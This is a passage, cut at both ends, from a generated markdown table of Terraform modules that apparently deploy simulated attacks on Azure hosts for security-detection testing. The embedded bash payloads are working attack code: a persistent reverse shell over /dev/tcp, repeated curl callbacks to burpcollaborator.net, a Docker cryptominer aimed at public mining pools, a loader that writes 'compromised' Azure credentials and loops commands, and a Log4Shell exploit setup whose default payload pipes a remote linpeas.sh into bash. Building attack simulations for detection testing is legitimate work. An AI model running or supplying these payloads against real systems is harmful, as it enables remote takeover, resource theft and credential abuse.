                                                                                                                                                                                                                                                                         |
| target-runbook-connect-oast-host                         | ./modules/runbook/connect-oast-host                  | runbook_connect_oast_host                        | context.azure.runbook.target.connect.oast                         | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;target&quot;: {<br/>                    &quot;connect&quot;: {<br/>                        &quot;oast&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;retry_delay_secs&quot;: 1800<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-oast-host                  | <pre>locals \{<br/>    oast\_domain = &quot;burpcollaborator\.net&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        OAST\_URL=&quot;https://$\(cat /dev/urandom \| tr \-dc &#x27;\[:lower:\]&#x27; \| fold \-w $$\{1:\-16\} \| head \-n 1\)\.$\{local\.oast\_domain\}&quot;<br/>        log &quot;http request: $OAST\_URL&quot;<br/>        curl \-s &quot;$OAST\_URL&quot; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &#x27;waiting $\{var\.inputs\[&quot;retry\_delay\_secs&quot;\]\} seconds\.\.\.&#x27;;<br/>        sleep $\{var\.inputs\[&quot;retry\_delay\_secs&quot;\]\}<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| target-runbook-connect-reverse-shell                     | ./modules/runbook/connect-reverse-shell              | runbook_exec_reverse_shell                       | context.azure.runbook.target.connect.reverse_shell                | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;target&quot;: {<br/>                    &quot;connect&quot;: {<br/>                        &quot;reverse_shell&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;host_ip&quot;: null,<br/>                            &quot;host_port&quot;: 4444<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-reverse-shell              | <pre>locals \{<br/>    host\_ip = var\.inputs\[&quot;host\_ip&quot;\]<br/>    host\_port = var\.inputs\[&quot;host\_port&quot;\]<br/><br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;attacker Host: $\{local\.host\_ip\}:$\{local\.host\_port\}&quot;<br/>    server=&quot;$\{local\.host\_ip\}&quot;<br/>    timeout=600<br/>    start\_time=$\(date \+%s\)<br/>    \# Check if $server is an IP address<br/>    if \[\[ $server =~ ^\[0\-9\]\+\\\.\[0\-9\]\+\\\.\[0\-9\]\+\\\.\[0\-9\]\+$ \]\]; then<br/>        log &quot;server is set to IP address $server, no need to resolve DNS&quot;<br/>    else<br/>        log &quot;checking dns resolution: $server&quot;<br/>        while true; do<br/>            ip=$\(dig \+short $server\)<br/>            if \[ \-z &quot;$ip&quot; \]; then  \# If $ip is empty, the domain hasn&#x27;t resolved yet<br/>                current\_time=$\(date \+%s\)<br/>                elapsed\_time=$\(\(current\_time \- start\_time\)\)<br/>                if \[ $elapsed\_time \-gt $timeout \]; then<br/>                    echo &quot;DNS resolution for $server timed out after $timeout seconds&quot;<br/>                    exit 1<br/>                fi<br/>                sleep 1<br/>            else<br/>                echo &quot;$server resolved to $ip&quot;<br/>                break<br/>            fi<br/>        done<br/>    fi<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        kill \-9 $\(ps aux \| grep &#x27;/bin/bash \-c bash \-i&#x27; \| head \-1 \| awk &#x27;\{ print $2 \}&#x27;\)<br/>        log &quot;running: /bin/bash \-c &#x27;bash \-i &gt;&amp; /dev/tcp/$\{local\.host\_ip\}/$\{local\.host\_port\} 0&gt;&amp;1&#x27;&quot;<br/>        while \! /bin/bash \-c &#x27;bash \-i &gt;&amp; /dev/tcp/$\{local\.host\_ip\}/$\{local\.host\_port\} 0&gt;&amp;1&#x27;; do<br/>            log &quot;reconnecting: $\{local\.host\_ip\}:$\{local\.host\_port\}&quot;;<br/>            sleep 10;<br/>        done;<br/>        log &#x27;waiting 30 minutes\.\.\.&#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| target-runbook-drop-malware-eicar                        | ./modules/runbook/drop-malware-eicar                 | runbook_deploy_malware_eicar                     | context.azure.runbook.target.drop.malware.eicar                   | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;target&quot;: {<br/>                    &quot;drop&quot;: {<br/>                        &quot;malware&quot;: {<br/>                            &quot;eicar&quot;: {<br/>                                &quot;eicar_path&quot;: &quot;/tmp/eicar&quot;,<br/>                                &quot;enabled&quot;: false<br/>                            }<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/drop-malware-eicar                 | <pre>locals \{<br/>    eicar\_string\_base64 = &quot;WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=&quot;<br/>    eicar\_path = var\.inputs\[&quot;eicar\_path&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        log &quot;starting script&quot;<br/>        log &quot;creating eicar file: $\{local\.eicar\_path\}\-$\(hostname\)&quot;<br/>        rm \-rf $\{local\.eicar\_path\}\*<br/>        echo \-n &#x27;$\{base64decode\(local\.eicar\_string\_base64\)\}&#x27; &gt; $\{local\.eicar\_path\}\-$\(hostname\)<br/>        log &quot;$\(ls \-l $\{local\.eicar\_path\}\-$\(hostname\)\)&quot;<br/>        log &#x27;waiting 30 minutes\.\.\.&#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    log &quot;Done\.&quot;<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| target-runbook-execute-docker-cpu-miner                  | ./modules/runbook/execute-docker-cpu-miner           | runbook_exec_docker_cpuminer                     | context.azure.runbook.target.execute.docker_cpu_miner             | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;target&quot;: {<br/>                    &quot;execute&quot;: {<br/>                        &quot;docker_cpu_miner&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;minergate_image&quot;: &quot;mkell43/minerd&quot;,<br/>                            &quot;minergate_name&quot;: &quot;minerd&quot;,<br/>                            &quot;minergate_server&quot;: &quot;stratum+tcp://eth.pool.minergate.com:45791&quot;,<br/>                            &quot;minergate_user&quot;: null,<br/>                            &quot;nicehash_image&quot;: &quot;a2ncer/nheqminer_cpu:latest&quot;,<br/>                            &quot;nicehash_name&quot;: &quot;nicehash&quot;,<br/>                            &quot;nicehash_server&quot;: &quot;equihash.usa.nicehash.com:3357&quot;,<br/>                            &quot;nicehash_user&quot;: null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-cpu-miner           | <pre>locals \{<br/>    \# nicehash\_name = var\.inputs\[&quot;nicehash\_name&quot;\]<br/>    \# nicehash\_image = var\.inputs\[&quot;nicehash\_image&quot;\]<br/>    \# nicehash\_server = var\.inputs\[&quot;nicehash\_server&quot;\]<br/>    \# nicehash\_user = var\.inputs\[&quot;nicehash\_user&quot;\]<br/>    minergate\_name = var\.inputs\[&quot;minergate\_name&quot;\]<br/>    minergate\_image = var\.inputs\[&quot;minergate\_image&quot;\]<br/>    minergate\_server = var\.inputs\[&quot;minergate\_server&quot;\]<br/>    minergate\_user=var\.inputs\[&quot;minergate\_user&quot;\]<br/><br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        log &quot;starting script&quot;<br/>        if \[\[ \`sudo docker ps \| grep $\{local\.minergate\_name\}\` \]\]; then docker stop $\{local\.minergate\_name\}; fi<br/>        sudo docker run \-\-rm \-d \-\-network=host \-\-name $\{local\.minergate\_name\} $\{local\.minergate\_image\} \-a cryptonight \-o $\{local\.minergate\_server\} \-u $\{ local\.minergate\_user \} \-p x<br/>        sudo docker ps \-a &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &#x27;waiting 30 minutes\.\.\.&#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    log &quot;Done\.&quot;<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| target-runbook-execute-generate-azure-cli-traffic-target | ./modules/runbook/execute-generate-azure-cli-traffic | runbook_exec_generate_azure_cli_traffic_target   | context.azure.runbook.target.execute.generate_azure_cli_traffic   | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;target&quot;: {<br/>                    &quot;execute&quot;: {<br/>                        &quot;generate_azure_cli_traffic&quot;: {<br/>                            &quot;commands&quot;: [],<br/>                            &quot;compromised_credentials&quot;: {},<br/>                            &quot;compromised_keys_user&quot;: null,<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;profile&quot;: &quot;azure-traffic&quot;<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-generate-azure-cli-traffic | <pre>locals \{<br/>    tool = &quot;az&quot;<br/>    attack\_dir = &quot;/generate\-azure\-cli\-traffic&quot;<br/>    azure\_creds = var\.inputs\[&quot;compromised\_credentials&quot;\]\[var\.inputs\[&quot;compromised\_keys\_user&quot;\]\]\.rendered<br/>    azure\_commands = join\(&quot;\\n&quot;, \[ for command in var\.inputs\[&quot;commands&quot;\]: &quot;$\{command\}&quot; \]\)<br/><br/>    payload = &lt;&lt;\-EOT<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    log &quot;Deploying azure credentials\.\.\.&quot;<br/>    mkdir \-p ~/\.azure<br/>    if \[  &quot;$\{ local\.azure\_creds == &quot;&quot; ? &quot;false&quot; : &quot;true&quot; \}&quot; == &quot;true&quot; \]; then<br/>      echo $\{base64gzip\(local\.azure\_creds\)\} \| base64 \-d \| gunzip &gt; ~/\.azure/my\.azureauth<br/>      export AZURE\_AUTH\_LOCATION=~/\.azure/my\.azureauth<br/>    fi<br/>    log &quot;Running azure commands\.\.\.&quot;<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        $\{local\.azure\_commands\}<br/>        log &#x27;waiting 30 minutes\.\.\.&#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    log &quot;Done\.&quot;<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        while \! command \-v $\{local\.tool\} &gt; /dev/null; do<br/>            log &quot;$\{local\.tool\} not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        while \! command \-v $\{local\.tool\} &gt; /dev/null; do<br/>            log &quot;$\{local\.tool\} not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| attacker-runbook-execute-docker-exploit-log4j            | ./modules/runbook/execute-docker-exploit-log4j       | runbook_exec_docker_exploit_log4j_app            | context.azure.runbook.attacker.execute.docker_exploit_log4j_app   | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;attacker&quot;: {<br/>                    &quot;execute&quot;: {<br/>                        &quot;docker_exploit_log4j_app&quot;: {<br/>                            &quot;attack_delay&quot;: 50400,<br/>                            &quot;attacker_http_port&quot;: 8088,<br/>                            &quot;attacker_ip&quot;: null,<br/>                            &quot;attacker_ldap_port&quot;: 1389,<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;payload&quot;: &quot;curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files&quot;,<br/>                            &quot;reverse_shell&quot;: false,<br/>                            &quot;reverse_shell_port&quot;: 0,<br/>                            &quot;target_ip&quot;: null,<br/>                            &quot;target_port&quot;: null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                   | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-exploit-log4j       | <pre>locals \{<br/>    attack\_dir = &quot;/jndiexploit&quot;<br/>    attack\_script = &quot;jndiexploit\.sh&quot;<br/>    start\_script = &quot;delayed\_start\.sh&quot;<br/>    lock\_file = &quot;/tmp/delay\_log4shell\.lock&quot;<br/>    jndiexploit\_url=&quot;https://github\.com/credibleforce/jndi/raw/main/jndi\.base64&quot;<br/>    image = &quot;openjdk:11&quot;<br/>    name = &quot;jndiexploit&quot;<br/>    exec\_type = var\.inputs\[&quot;reverse\_shell&quot;\] == true ? &quot;ReverseShell&quot; : &quot;Basic/Command/Base64&quot;<br/><br/>    \# only base64 encode the payload if we are executing a command<br/>    base64\_log4shell\_payload= urlencode\(var\.inputs\[&quot;reverse\_shell&quot;\] == true ? var\.inputs\[&quot;payload&quot;\] : base64encode\(<br/>       replace\(replace\(var\.inputs\[&quot;payload&quot;\], &quot;$ATTACKER\_IP&quot;, var\.inputs\[&quot;attacker\_ip&quot;\]\), &quot;$REVERSE\_SHELL\_PORT&quot;, var\.inputs\[&quot;reverse\_shell\_port&quot;\]\)<br/>    \)\)<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;removing previous app directory&quot;<br/>    docker stop $\{local\.name\}<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    log &quot;creating app directory&quot;<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    <br/>    log &quot;starting script\.\.\.&quot;<br/>    JNDIEXPLOIT\_URL=&quot;$\{local\.jndiexploit\_url\}&quot;<br/>    NAME=&quot;$\{local\.name\}&quot;<br/>    IMAGE=&quot;$\{local\.image\}&quot;<br/>    ATTACKER\_IP=&quot;$\{var\.inputs\[&quot;attacker\_ip&quot;\]\}&quot;<br/>    ATTACKER\_HTTP\_PORT=$\{var\.inputs\[&quot;attacker\_http\_port&quot;\]\}<br/>    ATTACKER\_LDAP\_PORT=$\{var\.inputs\[&quot;attacker\_ldap\_port&quot;\]\}<br/>    TARGET\_IP=$\{var\.inputs\[&quot;target\_ip&quot;\]\}<br/>    TARGET\_PORT=$\{var\.inputs\[&quot;target\_port&quot;\]\}<br/>    EXEC\_TYPE=&quot;$\{local\.exec\_type\}&quot;<br/>    REVERSE\_SHELL\_PORT=&quot;$\{var\.inputs\[&quot;reverse\_shell\_port&quot;\]\}&quot;<br/>    BASE64\_PAYLOAD=&quot;$\{local\.base64\_log4shell\_payload\}&quot;<br/>    PUBLIC\_IP=$\(curl \-s https://icanhazip\.com\)<br/>    TIMEOUT=1800<br/>    START\_TIME=$\(date \+%s\)<br/>    \# Check if $ATTACKER\_IP is an IP address<br/>    if \[\[ $ATTACKER\_IP =~ ^\[0\-9\]\+\\\.\[0\-9\]\+\\\.\[0\-9\]\+\\\.\[0\-9\]\+$ \]\]; then<br/>        log &quot;server is set to IP address $ATTACKER\_IP, no need to resolve DNS&quot;<br/>    else<br/>        log &quot;checking dns resolution: $ATTACKER\_IP&quot;<br/>        while true; do<br/>            IP=$\(dig \+short $ATTACKER\_IP\)<br/>            if \[ \-z &quot;$IP&quot; \]; then  \# If $IP is empty, the domain hasn&#x27;t resolved yet<br/>                CURRENT\_TIME=$\(date \+%s\)<br/>                ELAPSED\_TIME=$\(\(CURRENT\_TIME \- START\_TIME\)\)<br/>                if \[ $ELAPSED\_TIME \-gt $TIMEOUT \]; then<br/>                    log &quot;DNS resolution for $ATTACKER\_IP timed out after $TIMEOUT seconds&quot;<br/>                    exit 1<br/>                fi<br/>                sleep 10<br/>            else<br/>                log &quot;Current public ip: $PUBLIC\_IP&quot;<br/>                log &quot;$ATTACKER\_IP resolved to $IP&quot;<br/>                if \[ &quot;$IP&quot; == &quot;$PUBLIC\_IP&quot; \]; then<br/>                    log &quot;Resolution matches public ip: $IP == $PUBLIC\_IP&quot;<br/>                    break<br/>                else<br/>                    log &quot;Resolution of dns does not match: $IP \!= $PUBLIC\_IP&quot;<br/>                    sleep 10<br/>                fi<br/>            fi<br/>        done<br/>    fi<br/><br/>    if \[\[ \! \-f 